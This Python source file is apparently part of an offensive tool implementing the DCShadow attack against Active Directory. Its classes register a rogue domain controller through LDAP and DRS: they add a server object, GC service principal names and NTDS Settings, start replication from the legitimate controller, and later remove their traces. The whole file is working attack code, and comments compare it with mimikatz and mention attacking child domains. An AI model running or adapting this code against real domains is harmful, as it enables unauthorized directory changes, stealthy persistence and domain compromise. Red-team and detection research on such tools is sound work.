from R2Log import logger
from ldap3 import MODIFY_ADD, LEVEL, SUBTREE, MODIFY_DELETE, BASE

from dcshadow.manager.SessionsManager import SessionsManager
from dcshadow.model.ReplicationAttribute import ReplicationAttribute
from impacket import uuid


class DomainController:
    def __init__(self):
        self.distinguished_name: str = ""
        self.dns_hostname = str
        self.object_guid: bytes = b""
        self.invocation_id: bytes = b""
        self.replication_epoch: int = 0
        self.dc_ds_service_name: str = ""
        self.ds_service_name: str
        self.domain_nc: str
        self.schema_nc: str
        self.configuration_nc: str = ""
        self.func_level: int
        self.max_update_seq_num: int

    def enumNTDSSettings(self):
        logger.debug(f"Enumerating NTDS settings from: {self.dc_ds_service_name}")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.search(
            search_base=self.dc_ds_service_name,
            search_scope=LEVEL,
            search_filter="(name=NTDS Settings)",
            attributes=[
                "objectGUID",
                "invocationId",
                "msDS-ReplicationEpoch"
            ]
        )
        self.replication_epoch = ldap_client.session.entries[0]['msDS-ReplicationEpoch']
        self.invocation_id = ldap_client.session.entries[0]['invocationId'].raw_values[0]
        self.object_guid = ldap_client.session.entries[0]['objectGUID'].raw_values[0]
        logger.debug(f"└── invocation_id: {uuid.bin_to_string(self.invocation_id)}")
        logger.debug(f"└── object_guid: {uuid.bin_to_string(self.object_guid)}")


class RogueDomainController(DomainController):
    def __init__(self, domain, netbios_name, ds_service_name, domain_nc, schema_nc, configuration_nc, func_level, max_update_seq_num):
        super().__init__()
        self.domain = domain
        self.netbios_name: str = netbios_name
        self.ds_service_name = ds_service_name
        self.dc_ds_service_name = f"CN={self.netbios_name},{self.ds_service_name}"
        self.domain_nc = domain_nc
        self.schema_nc = schema_nc
        self.configuration_nc = configuration_nc
        self.func_level = func_level
        self.max_update_seq_num = max_update_seq_num
        self.__enumComputerObject()
        self.__register()
        # self.__unregister()

    def __createComputerObject(self):
        raise NotImplementedError

    def __registerDnsEntry(self):
        raise NotImplementedError

    def unregister(self):
        logger.verbose("Unregistering rogue domain controller")
        self.__removeNtdsSettings()
        self.__removeServerReferenceObject()
        self.__removeDcSpns()
        logger.success("Rogue domain controller unregistered successfully")

    def __removeNtdsSettings(self):
        # Removing NTDS Settings associated to Fake DC, as well as fake DC object in Configuration partition
        logger.debug("Removing Fake DC NTDS Settings")
        ldap_client = SessionsManager().get_ldap()
        _target_dsname = f"CN=NTDS Settings,{self.dc_ds_service_name}"
        ldap_client.session.delete(dn=_target_dsname)
        if ldap_client.check_ldap_result():
            logger.debug('LDAP Removal OK')
            logger.debug(f'Removed {_target_dsname}')
        else:
            logger.debug("Could not remove NTDS entry")

    def __removeServerReferenceObject(self):
        # Removing the whole server reference object in the config NC
        logger.debug("Removing Fake DC in Configuration partition")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.delete(dn=self.dc_ds_service_name)
        if ldap_client.check_ldap_result():
            logger.debug('LDAP Removal OK')
            logger.debug(f'Removed {self.dc_ds_service_name}')
        else:
            logger.debug("Could not remove Fake DC entry")

    def __removeDcSpns(self):
        # Removing ServicePrincipalNames
        logger.debug("Removing rogue DC Service Principal Names")
        ldap_client = SessionsManager().get_ldap()
        MSRPC_UUID_DRSUAPI = ("E3514235-4B06-11D1-AB04-00C04FC2DCD2", "4.0")  # TODO move this in a common space in utils?
        _spns_to_remove = []
        ldap_client.session.search(
            search_base=self.distinguished_name,
            search_scope=BASE,
            search_filter="(objectClass=*)",
            attributes="servicePrincipalName"
        )
        if len(ldap_client.session.entries) == 1:
            _spn_objectguid_prefix = f"{MSRPC_UUID_DRSUAPI[0]}/{uuid.bin_to_string(self.object_guid).lower()}/"
            _spn_gc = f"GC/{self.dns_hostname}/{self.domain}"
            logger.debug("Looking for the following SPNs")
            logger.debug(f"└── {_spn_objectguid_prefix}...")
            logger.debug(f"└── {_spn_gc}")
            logger.debug("Browsing current servicePrincipalNames")
            spns = ldap_client.session.entries[0]['servicePrincipalName']
            total_spns = len(spns)
            for index, spn in enumerate(spns):
                logger.debug(f"{'└──' if index == total_spns - 1 else '└──'} {spn}")
                if spn.startswith(_spn_objectguid_prefix) or spn == _spn_gc:
                    _spns_to_remove.append(spn)
            logger.debug("Removing Fake DC SPNs from associated computer object")
            logger.debug(f"SPN to remove: {_spns_to_remove}")
            ldap_client.session.modify(
                dn=self.distinguished_name,
                changes={'servicePrincipalName': [MODIFY_DELETE, _spns_to_remove]}
            )
            if ldap_client.check_ldap_result():
                logger.debug('LDAP SPN values removal OK')
                logger.debug("Removed SPNs")
        else:
            logger.debug("No SPN found... Something's probably wrong")

    def __register(self):
        logger.verbose("Registering rogue domain controller")
        self.__registerDomainControllerLdap()
        self.__addNtdsSettings()
        self.enumNTDSSettings()
        if self.object_guid and self.invocation_id:
            logger.success("Rogue domain controller registered successfully")

    def __registerDomainControllerLdap(self):
        logger.verbose("Registering rogue domain controller (LDAP step)")
        self.__addServerReferenceObject()
        self.__addDcSpns()
        #self.__addSupportedEncryptionTypes()

    def __addServerReferenceObject(self):
        logger.debug("Adding server reference object")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.add(
            dn=f"CN={self.netbios_name},{self.ds_service_name}",
            object_class="server",
            attributes={
                'dNSHostName': f"{self.dns_hostname}",
                'serverReference': f"{self.distinguished_name}"
            }
        )
        if ldap_client.check_ldap_result():
            logger.debug('LDAP object addition OK')

    def __addDcSpns(self):
        logger.debug("Adding SPNs to rogue DC computer object")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.modify(
            dn=self.distinguished_name,
            changes={
                'servicePrincipalName': [
                    MODIFY_ADD, [f"GC/{self.dns_hostname}/{self.domain}"]
                ]
            }
        )
        if ldap_client.check_ldap_result():
            logger.debug('LDAP SPN addition OK')

    def __addSupportedEncryptionTypes(self):
        logger.debug("Specifying supported encryption types to force AES")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.modify(
            dn=self.distinguished_name,
            changes={'msDS-SupportedEncryptionTypes': [MODIFY_ADD, 0x1F]}
        )
        if ldap_client.check_ldap_result():
            logger.debug('LDAP SPN addition OK')

    def __addNtdsSettings(self):
        logger.verbose("Registering rogue domain controller (DRS step)")
        attributes = {
            "objectClass": "1.2.840.113556.1.5.7000.47",
            "objectCategory": f"CN=NTDS-DSA,{self.schema_nc}",
            "dMDLocation": self.schema_nc,
            "invocationId": uuid.generate(),
            "options": 0,
            "systemFlags": 16,
            "serverReference": self.distinguished_name,
            "msDS-Behavior-Version": self.func_level,
            "msDS-HasDomainNCs": self.domain_nc,
            "msDS-hasMasterNCs": [self.domain_nc, self.configuration_nc, self.schema_nc],
            "hasMasterNCs": [self.domain_nc, self.configuration_nc, self.schema_nc]
        }
        repl_attributes = ReplicationAttribute.builder(attributes=attributes)
        drs_client = SessionsManager().get_drs()
        drs_client.add_entry(rogue_dc=self, repl_attributes=repl_attributes)  # FIXME it would make more sense to not have the repl_arguments but I don't know how to do it and not have a circular import

    def __enumComputerObject(self):
        logger.debug("Enumerating rogue domain controller computer object")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.search(
            # search_base=f"DC=north,{self.info['DomainNamingContext']}",  # FIXME, how does mimikatz know the domain to look in? Can't find in kuhl_m_lsadump_dcshadow_domaininfo_computer, statically setting for now
            search_base=self.domain_nc,  # TODO if when we attack child domains we need a dynamic base, then keep it that way. Else, retrieve the domain nc from the legit DC : ldap_client.server.info.other["rootDomainNamingContext"][0]
            search_filter=f"(&(|(objectClass=user)(objectClass=computer))(sAMAccountName={self.netbios_name}$))",
            attributes=[
                "distinguishedName",
                "userAccountControl",
                "dNSHostName",  # TODO this property doesn't seem to be set when creating a computer account with addcomputer.py SAMR. LDAPS method must be used.
                "msDS-SupportedEncryptionTypes"
            ]
        )
        # TODO raise an error if the object doesn't exist
        self.distinguished_name = ldap_client.session.entries[0]['distinguishedName'].raw_values[0].decode('utf-8')
        self.dns_hostname = ldap_client.session.entries[0]['dNSHostName'].raw_values[0].decode('utf-8')
        logger.debug(f"└── Distinguished name: {self.distinguished_name}")
        logger.debug(f"└── DNS hostname (FQDN): {self.dns_hostname}")
        try:
            logger.debug(f"└── msDS-SupportedEncryptionTypes: {ldap_client.session.entries[0]['msDS-SupportedEncryptionTypes'][0]}")
        except IndexError:
            logger.debug(f"msDS-SupportedEncryptionTypes: not set")


class LegitDomainController(DomainController):
    def __init__(self, fqdn):
        super().__init__()
        self.dns_hostname = fqdn
        self.__enumLdapServer()

    def __enumLdapServer(self):
        logger.debug("Enumerating legitimate domain controller")
        ldap_client = SessionsManager().get_ldap()
        self.domain_nc = ldap_client.server.info.other["rootDomainNamingContext"][0]
        self.configuration_nc = ldap_client.server.info.other["configurationNamingContext"][0]
        self.schema_nc = ldap_client.server.info.other["schemaNamingContext"][0]
        self.dc_ds_service_name = ldap_client.server.info.other["dsServiceName"][0]
        self.ds_service_name = ",".join(self.dc_ds_service_name.split(",")[2:])
        self.func_level = int(ldap_client.server.info.other["domainControllerFunctionality"][0])
        FUNCTIONALITY_LEVEL = ["WIN2000", "WIN2003_WITH_MIXED_DOMAINS", "WIN2003", "WIN2008", "WIN2008R2", "WIN2012", "WIN2012R2", "WIN2016"]
        self.func_level_str = FUNCTIONALITY_LEVEL[self.func_level]
        self.max_update_seq_num = ldap_client.server.info.other["highestCommittedUSN"][0]
        logger.debug(f"└── Domain NC: {self.domain_nc}")
        logger.debug(f"└── Domain Controller FQDN: {self.dns_hostname}")
        logger.debug(f"└── Configuration NC: {self.configuration_nc}")
        logger.debug(f"└── Schema NC: {self.schema_nc}")
        logger.debug(f"└── Ds Service Name: {self.ds_service_name}")
        logger.debug(f"└── Functionality level: {self.func_level_str}")
        logger.debug(f"└── Highest Committed USN: {self.max_update_seq_num}")

    def initReplication(self, rogue_dc_dns_hostname):
        drs_client = SessionsManager().get_drs()
        add_request = drs_client.replica_add(rogue_dc_dns_hostname=rogue_dc_dns_hostname, naming_context=self.domain_nc)
        drs_client.replica_del(replica_add_request=add_request)
